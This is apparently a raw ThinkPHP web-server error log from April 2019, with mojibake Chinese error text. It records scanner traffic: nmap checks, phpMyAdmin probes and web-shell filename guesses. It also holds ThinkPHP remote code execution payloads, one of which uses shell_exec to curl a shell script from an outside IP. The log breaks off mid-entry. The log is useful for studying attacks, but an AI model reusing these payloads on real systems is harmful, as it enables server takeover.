[ 2019-04-11T02:52:51+08:00 ] 80.82.70.187 /cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000219s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T03:29:29+08:00 ] 43.230.11.58 /nmaplowercheck1554924567
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000235s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Nmaplowercheck1554924567

[ 2019-04-11T03:29:29+08:00 ] 43.230.11.58 /nmaplowercheck1554924567
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000210s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T03:29:29+08:00 ] 43.230.11.58 /HNAP1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000225s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:HNAP1

[ 2019-04-11T03:29:29+08:00 ] 43.230.11.58 /HNAP1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000199s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T03:29:29+08:00 ] 43.230.11.58 /sdk
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000212s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Sdk

[ 2019-04-11T03:29:29+08:00 ] 43.230.11.58 /sdk
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000227s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T05:53:04+08:00 ] 206.217.139.210 /HNAP1/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000218s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:HNAP1

[ 2019-04-11T05:53:04+08:00 ] 206.217.139.210 /HNAP1/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000216s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T06:23:42+08:00 ] 185.53.91.24 /admin/assets/js/views/login.js
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000260s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T09:28:20+08:00 ] 159.65.145.165 /phpMyAdmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000219s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T09:28:21+08:00 ] 159.65.145.165 /phpmyadmin/scripts/setup.php/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000376s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T09:28:21+08:00 ] 159.65.145.165 /pma/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000285s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T09:28:22+08:00 ] 159.65.145.165 /myadmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000338s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T09:28:23+08:00 ] 159.65.145.165 /MyAdmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000257s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T09:28:23+08:00 ] 159.65.145.165 /mysql/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000254s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T09:28:24+08:00 ] 159.65.145.165 /scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000263s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T09:28:25+08:00 ] 159.65.145.165 /mysqlmanager/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000215s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T12:56:42+08:00 ] 80.82.70.187 /cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000219s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T13:02:43+08:00 ] 113.237.180.117 /otsmobile/mgw.htm?operationType=com.cars.otsmobile.queryLeftTicket&requestData=%5B%7B"train_date"%3A"20181231"%2C"purpose_codes"%3A"00"%2C"from_station"%3A"BJP"%2C"to_station"%3A"SHH"%2C"station_train_code"%3A""%2C"start_time_begin"%3A"0000"%2C"start_time_end"%3A"2400"%2C"train_headers"%3A"QB%23"%2C"train_flag"%3A""%2C"seat_type"%3A"0"%2C"seatBack_Type"%3A""%2C"ticket_num"%3A""%2C"dfpStr"%3A""%2C"baseDTO"%3A%7B"check_code"%3A"d38a201f2de926ce0686aedfdcf2de68"%2C"device_no"%3A"WtaHBzID7ZQDADJh05y5LLpd"%2C"mobile_no"%3A""%2C"os_type"%3A"a"%2C"time_str"%3A"20181030152947"%2C"version_no"%3A"4.1.9"%7D%7D%5D&ts=1540884587652&sign=37b8ebe6406579e4fb2ac8c9038eab37
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000226s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Otsmobile

[ 2019-04-11T13:02:43+08:00 ] 113.237.180.117 /otsmobile/mgw.htm?operationType=com.cars.otsmobile.queryLeftTicket&requestData=%5B%7B"train_date"%3A"20181231"%2C"purpose_codes"%3A"00"%2C"from_station"%3A"BJP"%2C"to_station"%3A"SHH"%2C"station_train_code"%3A""%2C"start_time_begin"%3A"0000"%2C"start_time_end"%3A"2400"%2C"train_headers"%3A"QB%23"%2C"train_flag"%3A""%2C"seat_type"%3A"0"%2C"seatBack_Type"%3A""%2C"ticket_num"%3A""%2C"dfpStr"%3A""%2C"baseDTO"%3A%7B"check_code"%3A"d38a201f2de926ce0686aedfdcf2de68"%2C"device_no"%3A"WtaHBzID7ZQDADJh05y5LLpd"%2C"mobile_no"%3A""%2C"os_type"%3A"a"%2C"time_str"%3A"20181030152947"%2C"version_no"%3A"4.1.9"%7D%7D%5D&ts=1540884587652&sign=37b8ebe6406579e4fb2ac8c9038eab37
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000302s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T15:07:53+08:00 ] 128.199.56.66 /public/index.php?s=/Index/%09hink%07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20http://46.183.218.243/Pemex.sh
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000233s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T15:37:59+08:00 ] 77.247.109.70 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000236s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Robots

[ 2019-04-11T15:37:59+08:00 ] 77.247.109.70 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000205s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T16:00:15+08:00 ] 104.192.74.24 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000222s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Robots

[ 2019-04-11T18:01:35+08:00 ] 139.162.88.63 /echo.php?info=1234567890
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000225s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:37+08:00 ] 118.89.215.182 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000260s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Robots

[ 2019-04-11T20:39:37+08:00 ] 118.89.215.182 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000219s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:37+08:00 ] 118.89.215.182 /App5efc5d2f.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000212s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:37+08:00 ] 118.89.215.182 /help.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000211s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:37+08:00 ] 118.89.215.182 /java.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000215s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:37+08:00 ] 118.89.215.182 /_query.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000203s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:37+08:00 ] 118.89.215.182 /test.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000225s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:37+08:00 ] 118.89.215.182 /db_cts.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000212s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:41+08:00 ] 118.89.215.182 /db_pma.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000208s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:41+08:00 ] 118.89.215.182 /logon.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: [ app_init ] --END-- [ RunTime:0.000315s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:41+08:00 ] 118.89.215.182 /help-e.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000207s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:41+08:00 ] 118.89.215.182 /license.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000225s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:41+08:00 ] 118.89.215.182 /log.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000214s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:41+08:00 ] 118.89.215.182 /hell.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000214s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:41+08:00 ] 118.89.215.182 /pmd_online.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000213s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:41+08:00 ] 118.89.215.182 /x.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000229s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:43+08:00 ] 118.89.215.182 /shell.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000223s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:43+08:00 ] 118.89.215.182 /htdocs.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000222s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:45+08:00 ] 118.89.215.182 /desktop.ini.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000242s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:45+08:00 ] 118.89.215.182 /z.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000209s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:45+08:00 ] 118.89.215.182 /lala.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000421s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:45+08:00 ] 118.89.215.182 /lala-dpr.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000215s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:45+08:00 ] 118.89.215.182 /wpc.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000060s ]
INFO: [ app_init ] --END-- [ RunTime:0.000265s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:45+08:00 ] 118.89.215.182 /wpo.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000224s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:45+08:00 ] 118.89.215.182 /t6nv.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000219s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:45+08:00 ] 118.89.215.182 /muhstik.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000216s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:45+08:00 ] 118.89.215.182 /text.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000221s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:45+08:00 ] 118.89.215.182 /wp-config.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000225s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:45+08:00 ] 118.89.215.182 /muhstik.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000219s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:45+08:00 ] 118.89.215.182 /muhstik2.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000215s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:45+08:00 ] 118.89.215.182 /muhstiks.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000225s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:46+08:00 ] 118.89.215.182 /muhstik-dpr.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000222s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:49+08:00 ] 118.89.215.182 /lol.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000222s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:49+08:00 ] 118.89.215.182 /uploader.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000200s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:49+08:00 ] 118.89.215.182 /cmd.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000210s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:49+08:00 ] 118.89.215.182 /cmv.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000221s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:49+08:00 ] 118.89.215.182 /cmdd.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000250s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:49+08:00 ] 118.89.215.182 /knal.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000309s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:49+08:00 ] 118.89.215.182 /cmd.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000205s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:49+08:00 ] 118.89.215.182 /shell.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000221s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:49+08:00 ] 118.89.215.182 /appserv.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000212s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:49+08:00 ] 118.89.215.182 /scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
INFO: [ app_init ] --END-- [ RunTime:0.000232s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:49+08:00 ] 118.89.215.182 /phpmyadmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000202s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:49+08:00 ] 118.89.215.182 /phpMyAdmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000236s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:49+08:00 ] 118.89.215.182 /phpmyadmin/scripts/db___.init.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000215s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:49+08:00 ] 118.89.215.182 /phpMyAdmin/scripts/db___.init.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000255s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:49+08:00 ] 118.89.215.182 /plugins/weathermap/editor.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000204s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:49+08:00 ] 118.89.215.182 /cacti/plugins/weathermap/editor.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000224s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:50+08:00 ] 118.89.215.182 /index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%4Äñò
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000316s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Index

[ 2019-04-11T20:39:50+08:00 ] 118.89.215.182 /index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%4Äñò
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000224s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:50+08:00 ] 118.89.215.182 /d7.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000217s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:53+08:00 ] 118.89.215.182 /rxr.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000234s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:53+08:00 ] 118.89.215.182 /1x.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000234s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:53+08:00 ] 118.89.215.182 /home.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000203s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:53+08:00 ] 118.89.215.182 /undx.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000202s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:53+08:00 ] 118.89.215.182 /spider.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000238s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:53+08:00 ] 118.89.215.182 /payload.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000295s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:53+08:00 ] 118.89.215.182 /composers.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000235s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:53+08:00 ] 118.89.215.182 /izom.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000261s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:53+08:00 ] 118.89.215.182 /composer.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000249s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:39:53+08:00 ] 118.89.215.182 /hue2.php
INFO: [ app_init ] --START--
